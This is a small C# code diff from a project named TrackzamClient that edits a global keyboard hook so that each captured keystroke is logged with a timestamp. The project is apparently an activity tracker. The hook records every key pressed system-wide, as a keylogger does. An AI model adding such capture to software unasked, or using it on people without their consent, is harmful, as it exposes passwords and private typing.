@@ -88,8 +88,7 @@ namespace TrackzamClient
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-
-                _writer.WriteLine((Keys)vkCode);
+                _writer.WriteLine("{0} {1}", (Keys)vkCode, TrackzamTimer.GetNowClockString());
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
